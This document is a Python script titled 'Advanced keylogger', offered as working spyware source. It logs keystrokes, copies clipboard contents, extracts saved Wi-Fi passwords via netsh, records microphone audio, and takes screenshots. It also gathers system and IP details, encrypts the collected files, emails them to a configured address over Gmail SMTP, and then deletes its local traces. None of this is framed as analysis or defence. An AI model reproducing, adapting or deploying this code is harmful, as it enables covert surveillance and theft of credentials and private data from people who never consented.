# Advanced keylogger

# Libraries
#email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
#computer info
import socket
import platform
from requests import get
#clipboard
import win32clipboard
#wifi info
import subprocess
import re
#keylogging
from pynput.keyboard import Listener
import time
import os
import shutil
#multithreading
import threading
import concurrent.futures
#audio
from scipy.io.wavfile import write
import sounddevice as sd
#encryption
from cryptography.fernet import Fernet
#screenshot
from PIL import ImageGrab
#importing variables
import json

with open('config.json') as f:
    config = json.load(f)


keys_information = config["keys_information"]
keys_send = config["keys_send"]
system_information = config["system_information"]
clipboard_information = config["clipboard_information"]
wifi_information = config["wifi_information"]
audio_information = config["audio_information"]
screenshot_information = config["screenshot_information"]

keys_send_e = config["keys_send_e"]
system_information_e = config["system_information_e"]
clipboard_information_e = config["clipboard_information_e"]
wifi_information_e = config["wifi_information_e"]

microphone_time = config["microphone_time"]
time_iteration = config["time_iteration"]

email_address = config["from_email"] 
password = config["password"] 

toaddr = config["to_email"] 

key = config["key"] 

file_path = config["file_path"] 

if not os.path.exists(file_path):
    os.makedirs(file_path)

extend = "\\"
file_merge = file_path + extend

files_to_encrypt = [file_merge + clipboard_information, file_merge + keys_send]
send_file_names = [file_merge + clipboard_information_e, file_merge + keys_send_e, file_merge + audio_information, file_merge + screenshot_information ]
system_files = [ file_merge + system_information, file_merge + wifi_information ]
encrypted_system_files = [file_merge + system_information_e, file_merge + wifi_information_e ]

# email controls
def send_email(file_list, subject, body):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = subject

    body = body

    msg.attach(MIMEText(body, 'plain'))
    
    for file in file_list:
        attachment = open(file, 'rb')
        mime_base = MIMEBase('application', 'octet-stream')
        mime_base.set_payload((attachment).read())
        encoders.encode_base64(mime_base)
        mime_base.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(file)}')
        msg.attach(mime_base)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
t1 = threading.Thread(target=computer_information)
t1.start()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

#get the wifi profiles
def get_wifi_profiles():
    with open(file_path + extend + wifi_information, "a") as f:
        try:
            # Run the command to get WiFi profiles
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, check=True)
            output = result.stdout

            # Extract profile names from the output
            profile_names = re.findall(r'All User Profile\s+:\s(.*)', output)

            wifi_profiles = []

            for name in profile_names:
                # For each profile, run the command to get the key (password)
                profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], capture_output=True, text=True, check=True)
                profile_output = profile_info.stdout

                # Extract the password from the profile output
                password = re.search(r'Key Content\s+:\s(.*)', profile_output)

                if password is None:
                    wifi_profiles.append((name, "No password set"))
                else:
                    wifi_profiles.append((name, password.group(1)))

            return wifi_profiles

        except subprocess.CalledProcessError as e:
            f.write(f"Error retrieving WiFi profiles: {e}")
            return None

#get the wifi passwords into a file
def save_wifi_passwords():
    with open(file_path + extend + wifi_information, "a") as f:
        wifi_profiles = get_wifi_profiles()

        if wifi_profiles is None:
            f.write("Failed to retrieve WiFi profiles. Check error messages for details.")
            return
        
        for profile, password in wifi_profiles:
            f.write(f"SSID: {profile}\nPassword: {password}\n\n")
t2 = threading.Thread(target=save_wifi_passwords)
t2.start()

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Encrypt files
def encryption():
    count = 0

    for encrypting_file in files_to_encrypt:

        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(send_file_names[count], 'wb') as f:
            f.write(encrypted)
        count += 1   
       
#onetime log with system information
def send_once():
    count = 0
    t1.join()
    t2.join()
    for encrypting_file in system_files:
        with open(system_files[count], 'rb') as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(encrypted_system_files[count], 'wb') as f:
            f.write(encrypted)       
        count+=1
    send_email(encrypted_system_files, "SYSTEM INFO + WIFI PASSWORDS", "Encrypted Files attached")
t3 = threading.Thread(target=send_once)
t3.start()

#keylogger file function
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            else:
                f.write(k)
                f.close()
            
#keylogger key recording function                
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def on_release(key):
    currentTime = time.time()
    if currentTime > stoppingTime:
        return False

with open(file_path + extend + keys_information, "a") as f:
    f.write("KEY_LOGS\n----------"+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+"----------\n")
    f.close()

count = 0
keys = []
currentTime = time.time()
stoppingTime = currentTime + time_iteration
listener = Listener( on_press=on_press, on_release=on_release)
listener.start()

# timer
while currentTime < stoppingTime:
    # Use ThreadPoolExecutor to execute functions
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        # Execute three functions simultaneously
        futures = [executor.submit(copy_clipboard), executor.submit(microphone), executor.submit(screenshot)]

        # Wait for the first three functions to complete
        concurrent.futures.wait(futures)

        # Execute the fourth function
        shutil.copyfile(file_merge + keys_information, file_merge + keys_send)
        keys =[] 
        with open(file_merge + keys_information, "w") as f:
            f.write(" ")
        future4 = executor.submit(encryption)
        future4.result()  # Wait for the fourth function to complete

        # Execute the fifth function
        future5 = executor.submit(send_email, send_file_names, time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), "LOG FILES")
        future5.result()  # Wait for the fifth function to complete    
    
    currentTime = time.time()

                            
t3.join()
delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
for file in delete_files:
    os.remove(file)
os.remove(file_merge + keys_information)
if not os.listdir(file_merge):
        # If empty, delete the folder
        os.rmdir(file_merge)